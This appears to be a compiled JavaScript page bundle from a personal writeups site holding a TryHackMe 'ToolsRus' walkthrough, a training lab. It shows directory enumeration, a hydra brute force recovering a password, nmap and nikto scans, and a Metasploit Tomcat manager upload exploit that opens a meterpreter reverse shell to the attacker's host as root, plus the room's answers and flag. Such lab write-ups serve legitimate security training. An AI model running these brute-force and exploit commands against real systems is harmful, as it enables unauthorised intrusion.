"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[757],{3905:(e,t,n)=>{n.d(t,{Zo:()=>c,kt:()=>d});var r=n(67294);function o(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function s(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function a(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?s(Object(n),!0).forEach((function(t){o(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):s(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,r,o=function(e,t){if(null==e)return{};var n,r,o={},s=Object.keys(e);for(r=0;r<s.length;r++)n=s[r],t.indexOf(n)>=0||(o[n]=e[n]);return o}(e,t);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);for(r=0;r<s.length;r++)n=s[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(o[n]=e[n])}return o}var i=r.createContext({}),p=function(e){var t=r.useContext(i),n=t;return e&&(n="function"==typeof e?e(t):a(a({},t),e)),n},c=function(e){var t=p(e.components);return r.createElement(i.Provider,{value:t},e.children)},u="mdxType",h={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},m=r.forwardRef((function(e,t){var n=e.components,o=e.mdxType,s=e.originalType,i=e.parentName,c=l(e,["components","mdxType","originalType","parentName"]),u=p(n),m=o,d=u["".concat(i,".").concat(m)]||u[m]||h[m]||s;return n?r.createElement(d,a(a({ref:t},c),{},{components:n})):r.createElement(d,a({ref:t},c))}));function d(e,t){var n=arguments,o=t&&t.mdxType;if("string"==typeof e||o){var s=n.length,a=new Array(s);a[0]=m;var l={};for(var i in t)hasOwnProperty.call(t,i)&&(l[i]=t[i]);l.originalType=e,l[u]="string"==typeof e?e:o,a[1]=l;for(var p=2;p<s;p++)a[p]=n[p];return r.createElement.apply(null,a)}return r.createElement.apply(null,n)}m.displayName="MDXCreateElement"},64904:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>i,contentTitle:()=>a,default:()=>h,frontMatter:()=>s,metadata:()=>l,toc:()=>p});var r=n(87462),o=(n(67294),n(3905));const s={},a="ToolsRus",l={unversionedId:"Tryhackme/ToolsRus/ToolsRus",id:"Tryhackme/ToolsRus/ToolsRus",title:"ToolsRus",description:"Practise using tools such as dirbuster, hydra, nmap, nikto and metasploit",source:"@site/writeups/Tryhackme/ToolsRus/ToolsRus.md",sourceDirName:"Tryhackme/ToolsRus",slug:"/Tryhackme/ToolsRus/",permalink:"/writeups/Tryhackme/ToolsRus/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Tony the Tiger",permalink:"/writeups/Tryhackme/Tony the Tiger/"},next:{title:"Tor",permalink:"/writeups/Tryhackme/Tor/"}},i={},p=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 ToysRus",id:"task-1-toysrus",level:2}],c={toc:p},u="wrapper";function h(e){let{components:t,...n}=e;return(0,o.kt)(u,(0,r.Z)({},c,n,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"toolsrus"},"ToolsRus"),(0,o.kt)("p",null,"Practise using tools such as dirbuster, hydra, nmap, nikto and metasploit "),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/toolsrus"},"ToolsRus")),(0,o.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Web Application Analysis"),(0,o.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Brute Forcing HTTP-GET"),(0,o.kt)("li",{parentName:"ul"},"Exploiting Tomcat")),(0,o.kt)("h2",{id:"task-1-toysrus"},"Task 1 ToysRus"),(0,o.kt)("p",null,"Your challenge is to use the tools listed below to enumerate a server, gathering information along the way that will eventually lead to you taking over the machine."),(0,o.kt)("p",null,"This task requires you to use the following tools:"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Dirbuster"),(0,o.kt)("li",{parentName:"ul"},"Hydra"),(0,o.kt)("li",{parentName:"ul"},"Nmap"),(0,o.kt)("li",{parentName:"ul"},"Nikto"),(0,o.kt)("li",{parentName:"ul"},"Metasploit")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},'What directory can you find, that begins with a "g"?')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/ToolsRus$ gobuster dir -u 10.10.149.167 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.149.167\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/10/12 20:10:03 Starting gobuster\n===============================================================\n/guidelines (Status: 301)\n/protected (Status: 401)\nProgress: 13621 / 220561 (6.18%)^C\n[!] Keyboard interrupt detected, terminating.\n===============================================================\n2020/10/12 20:11:02 Finished\n===============================================================\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"/guidelines")),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"Whose name can you find from this directory?")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"view-source:http://10.10.149.167/guidelines/"},"view-source:http://10.10.149.167/guidelines/")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"bob")),(0,o.kt)("ol",{start:3},(0,o.kt)("li",{parentName:"ol"},"What directory has basic authentication?")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"http://10.10.149.167/protected"},"http://10.10.149.167/protected")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"/protected")),(0,o.kt)("ol",{start:4},(0,o.kt)("li",{parentName:"ol"},"What is bob's password to the protected part of the website?")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/ToolsRus$ hydra -l bob -P /usr/share/wordlists/rockyou.txt -f 10.10.149.167 http-get /protected/\nHydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-12 20:14:02\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task\n[DATA] attacking http-get://10.10.149.167:80/protected/\n[80][http-get] host: 10.10.149.167   login: bob   password: bubbles\n[STATUS] attack finished for 10.10.149.167 (valid pair found)\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-12 20:14:08\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"bubbles")),(0,o.kt)("ol",{start:5},(0,o.kt)("li",{parentName:"ol"},"What other port that serves a webs service is open on the machine?")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/ToolsRus$ sudo nmap -p- -A -sS -sC -sV -O --script vuln 10.10.149.167\n[sudo] password for kali: \nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-12 20:08 CEST\nPre-scan script results:\n| broadcast-avahi-dos: \n|   Discovered hosts:\n|     224.0.0.251\n|   After NULL UDP avahi packet DoS (CVE-2011-1002).\n|_  Hosts are all up (not vulnerable).\nNmap scan report for 10.10.149.167\nHost is up (0.058s latency).\nNot shown: 65531 closed ports\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n|_clamav-exec: ERROR: Script execution failed (use -d to debug)\n| vulners: \n|   cpe:/a:openbsd:openssh:7.2p2: \n|       CVE-2016-8858   7.8     https://vulners.com/cve/CVE-2016-8858\n|       CVE-2016-6515   7.8     https://vulners.com/cve/CVE-2016-6515\n|       CVE-2016-10009  7.5     https://vulners.com/cve/CVE-2016-10009\n|       CVE-2016-10012  7.2     https://vulners.com/cve/CVE-2016-10012\n|       CVE-2015-8325   7.2     https://vulners.com/cve/CVE-2015-8325\n|       CVE-2016-10010  6.9     https://vulners.com/cve/CVE-2016-10010\n|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111\n|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919\n|       CVE-2018-15473  5.0     https://vulners.com/cve/CVE-2018-15473\n|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906\n|       CVE-2016-10708  5.0     https://vulners.com/cve/CVE-2016-10708\n|       CVE-2019-16905  4.4     https://vulners.com/cve/CVE-2019-16905\n|       CVE-2016-6210   4.3     https://vulners.com/cve/CVE-2016-6210\n|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110\n|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109\n|       CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685\n|_      CVE-2016-10011  2.1     https://vulners.com/cve/CVE-2016-10011\n80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_clamav-exec: ERROR: Script execution failed (use -d to debug)\n|_http-csrf: Couldn't find any CSRF vulnerabilities.\n|_http-dombased-xss: Couldn't find any DOM based XSS.\n| http-enum: \n|_  /protected/: Potentially interesting folder (401 Unauthorized)\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n| http-slowloris-check: \n|   VULNERABLE:\n|   Slowloris DOS attack\n|     State: LIKELY VULNERABLE\n|     IDs:  CVE:CVE-2007-6750\n|       Slowloris tries to keep many connections to the target web server open and hold\n|       them open as long as possible.  It accomplishes this by opening connections to\n|       the target web server and sending a partial request. By doing so, it starves\n|       the http server's resources causing Denial Of Service.\n|       \n|     Disclosure date: 2009-09-17\n|     References:\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750\n|_      http://ha.ckers.org/slowloris/\n|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.\n| vulners: \n|   cpe:/a:apache:http_server:2.4.18: \n|       CVE-2020-11984  7.5     https://vulners.com/cve/CVE-2020-11984\n|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679\n|       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668\n|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169\n|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167\n|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211\n|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312\n|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715\n|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082\n|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788\n|       CVE-2019-10097  6.0     https://vulners.com/cve/CVE-2019-10097\n|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217\n|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927\n|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098\n|       CVE-2016-5387   5.1     https://vulners.com/cve/CVE-2016-5387\n|       CVE-2020-9490   5.0     https://vulners.com/cve/CVE-2020-9490\n|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934\n|       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081\n|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220\n|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196\n|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199\n|       CVE-2018-17189  5.0     https://vulners.com/cve/CVE-2018-17189\n|       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333\n|       CVE-2018-1303   5.0     https://vulners.com/cve/CVE-2018-1303\n|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798\n|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710\n|       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743\n|       CVE-2016-8740   5.0     https://vulners.com/cve/CVE-2016-8740\n|       CVE-2016-4979   5.0     https://vulners.com/cve/CVE-2016-4979\n|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197\n|       CVE-2020-11993  4.3     https://vulners.com/cve/CVE-2020-11993\n|       CVE-2020-11985  4.3     https://vulners.com/cve/CVE-2020-11985\n|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092\n|       CVE-2018-1302   4.3     https://vulners.com/cve/CVE-2018-1302\n|       CVE-2018-1301   4.3     https://vulners.com/cve/CVE-2018-1301\n|       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763\n|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975\n|       CVE-2016-1546   4.3     https://vulners.com/cve/CVE-2016-1546\n|       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283\n|_      CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612\n1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1\n|_clamav-exec: ERROR: Script execution failed (use -d to debug)\n|_http-csrf: Couldn't find any CSRF vulnerabilities.\n|_http-dombased-xss: Couldn't find any DOM based XSS.\n| http-enum: \n|   /examples/: Sample scripts\n|   /manager/html/upload: Apache Tomcat (401 Unauthorized)\n|   /manager/html: Apache Tomcat (401 Unauthorized)\n|_  /docs/: Potentially interesting folder\n|_http-server-header: Apache-Coyote/1.1\n| http-slowloris-check: \n|   VULNERABLE:\n|   Slowloris DOS attack\n|     State: LIKELY VULNERABLE\n|     IDs:  CVE:CVE-2007-6750\n|       Slowloris tries to keep many connections to the target web server open and hold\n|       them open as long as possible.  It accomplishes this by opening connections to\n|       the target web server and sending a partial request. By doing so, it starves\n|       the http server's resources causing Denial Of Service.\n|       \n|     Disclosure date: 2009-09-17\n|     References:\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750\n|_      http://ha.ckers.org/slowloris/\n|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.\n8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)\n|_clamav-exec: ERROR: Script execution failed (use -d to debug)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/12%OT=22%CT=1%CU=33726%PV=Y%DS=2%DC=T%G=Y%TM=5F849D\nOS:22%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS=8)OP\nOS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST\nOS:11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC\nOS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(\nOS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%\nOS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N\nOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C\nOS:D=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 587/tcp)\nHOP RTT      ADDRESS\n1   56.70 ms 10.8.0.1\n2   56.98 ms 10.10.149.167\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 396.07 seconds\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"1234")),(0,o.kt)("ol",{start:6},(0,o.kt)("li",{parentName:"ol"},"Going to the service running on that port, what is the name and version of the software? Answer format: Full_name_of_service/Version")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/ToolsRus$ curl -s http://10.10.149.167:1234/ | grep -Po "<h1>(.*)</h1>"<h1>Apache Tomcat/7.0.88</h1>\n')),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"Apache Tomcat/7.0.88")),(0,o.kt)("ol",{start:7},(0,o.kt)("li",{parentName:"ol"},"Use Nikto with the credentials you have found and scan the /manager/html directory on the port found above. How many documentation files did Nikto identify?")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/ToolsRus$ nikto -h 10.10.149.167:1234/manager/html -id \"bob:bubbles\"\n- Nikto v2.1.6\n---------------------------------------------------------------------------\n+ Target IP:          10.10.149.167\n+ Target Hostname:    10.10.149.167\n+ Target Port:        1234/manager/html\n+ Start Time:         2020-10-12 20:16:03 (GMT2)\n---------------------------------------------------------------------------\n+ Server: Apache-Coyote/1.1\n+ The anti-clickjacking X-Frame-Options header is not present.\n+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS\n+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type\n+ No CGI Directories found (use '-C all' to force check all possible dirs)\n+ OSVDB-39272: /favicon.ico file identifies this app/server as: Apache Tomcat (possibly 5.5.26 through 8.0.15), Alfresco Community\n+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS \n+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.\n+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.\n+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.\n+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.\n+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.\n+ Successfully authenticated to realm 'Tomcat Manager Application' with user-supplied credentials.\n+ /manager/html: Tomcat Manager / Host Manager interface found (pass protected)\n+ /host-manager/html: Tomcat Manager / Host Manager interface found (pass protected)\n+ /manager/status: Tomcat Server Status interface found (pass protected)\n+ 7892 requests: 0 error(s) and 14 item(s) reported on remote host\n+ End Time:           2020-10-12 20:22:31 (GMT2) (388 seconds)\n---------------------------------------------------------------------------\n+ 1 host(s) tested\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"5")),(0,o.kt)("ol",{start:8},(0,o.kt)("li",{parentName:"ol"},"What is the server version (run the scan against port 80)?")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/ToolsRus$ nikto -h 10.10.149.167- Nikto v2.1.6\n---------------------------------------------------------------------------\n+ Target IP:          10.10.149.167\n+ Target Hostname:    10.10.149.167\n+ Target Port:        80\n+ Start Time:         2020-10-12 20:21:38 (GMT2)\n---------------------------------------------------------------------------\n+ Server: Apache/2.4.18 (Ubuntu)\n+ The anti-clickjacking X-Frame-Options header is not present.\n+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS\n+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"Apache/2.4.18")),(0,o.kt)("ol",{start:9},(0,o.kt)("li",{parentName:"ol"},"What version of Apache-Coyote is this service using?")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"1.1")),(0,o.kt)("ol",{start:10},(0,o.kt)("li",{parentName:"ol"},"Use Metasploit to exploit the service and get a shell on the system. What user did you get a shell as?")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://charlesreid1.com/wiki/Metasploitable/Apache/Tomcat_and_Coyote"},"https://charlesreid1.com/wiki/Metasploitable/Apache/Tomcat_and_Coyote")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/ToolsRus$ msfconsole -q\n[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp\nmsf5 exploit(windows/smb/ms17_010_eternalblue) > use exploit/multi/http/tomcat_mgr_upload\n[*] No payload configured, defaulting to java/meterpreter/reverse_tcp\nmsf5 exploit(multi/http/tomcat_mgr_upload) > show options\n\nModule options (exploit/multi/http/tomcat_mgr_upload):\n\n   Name          Current Setting  Required  Description\n   ----          ---------------  --------  -----------\n   HttpPassword                   no        The password for the specified username\n   HttpUsername                   no        The username to authenticate as\n   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS                         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT         80               yes       The target port (TCP)\n   SSL           false            no        Negotiate SSL/TLS for outgoing connections\n   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)\n   VHOST                          no        HTTP server virtual host\n\n\nPayload options (java/meterpreter/reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  192.168.178.52   yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Java Universal\n\n\nmsf5 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername bob\nHttpUsername => bob\nmsf5 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword bubbles\nHttpPassword => bubbles\nmsf5 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 10.10.149.167\nRHOSTS => 10.10.149.167\nmsf5 exploit(multi/http/tomcat_mgr_upload) > set RPORT 1234\nRPORT => 1234\nmsf5 exploit(multi/http/tomcat_mgr_upload) > set LHOST 10.8.106.222\nLHOST => 10.8.106.222\nmsf5 exploit(multi/http/tomcat_mgr_upload) > run\n\n[*] Started reverse TCP handler on 10.8.106.222:4444 \n[*] Retrieving session ID and CSRF token...\n[*] Uploading and deploying GHeXY...\n[*] Executing GHeXY...\n[*] Undeploying GHeXY ...\n[*] Sending stage (53944 bytes) to 10.10.149.167\n[*] Meterpreter session 1 opened (10.8.106.222:4444 -> 10.10.149.167:58258) at 2020-10-12 20:28:53 +0200\n\nmeterpreter > shell\nProcess 1 created.\nChannel 1 created.\nwhoami\nroot\n")),(0,o.kt)("ol",{start:11},(0,o.kt)("li",{parentName:"ol"},"What text is in the file /root/flag.txt")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"cd /root\ncat flag.txt\nff1fc4a81affcc7688cf89ae7dc6e0e1\n")))}h.isMDXComponent=!0}}]);